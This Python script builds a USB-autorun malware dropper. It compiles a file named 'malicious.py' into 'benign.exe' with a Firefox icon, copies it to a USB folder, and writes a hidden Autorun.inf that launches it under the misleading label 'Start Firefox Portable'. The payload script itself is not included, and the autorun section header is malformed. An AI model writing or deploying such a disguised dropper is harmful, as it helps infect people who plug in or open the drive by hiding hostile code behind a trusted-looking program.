import PyInstaller.__main__
import shutil
import os

filename="malicious.py"
exename="benign.exe"
pwd=os.getcwd()
icon="Firefox.ico"
 #getting current directory path
usbdir=os.path.join(pwd,"USB") #directory path for the hypothetical USB Drive

#To keep a check that our executable filename is not already present
if(os.path.exists(exename)):
    os.remove(exename)

print("Creating EXE")

PyInstaller.__main__.run([
    "malicious.py", #name of the file to be executed
    "--onefile", #this results in only one file else python may give out many files
    "--clean", 
    "--log-level=ERROR", #for only displaying errors and minimizing the logs
    "--name=" + exename, # name of the file for user display
    "--icon=" + icon
])
print("EXE created")

shutil.move(os.path.join(pwd,"dist",exename),pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
cache_dir = os.path.join(pwd, "__pycache__") #check for __pycache__ since it may not get downloaded everytime
if os.path.exists(cache_dir):
    shutil.rmtree(cache_dir)
os.remove(exename+".spec")
#all the above statements are for clearing the extra files.
print("Creating Autorun file")

with open("Autorun.inf","w") as o:
    o.write("(Autorun)\n")
    o.write("Open="+exename+"\n")
    o.write("Action=Start Firefox Portable\n")
    o.write("Label=My USB\n")
    o.write("Icon="+exename+"\n")

#When a file is downloaded we must mention the filename, action upon clicked and the label i.e the USB name and icon.

print("Setting up USB")

shutil.move(exename,usbdir) #changing the path of exename to usbdir.
shutil.move("Autorun.inf",usbdir)
print("Attrib +h "+os.path.join(usbdir,"Autorun.inf")) #keep the space after +h in mind since it is important for the cmd to correctly interpret
os.system("attrib +h \"" + os.path.join(usbdir, "Autorun.inf") + "\"") #attrib +h is used to hide the file

#This code uses python 3.8.5 since 3.9.0 does not support PyInstaller.__main__
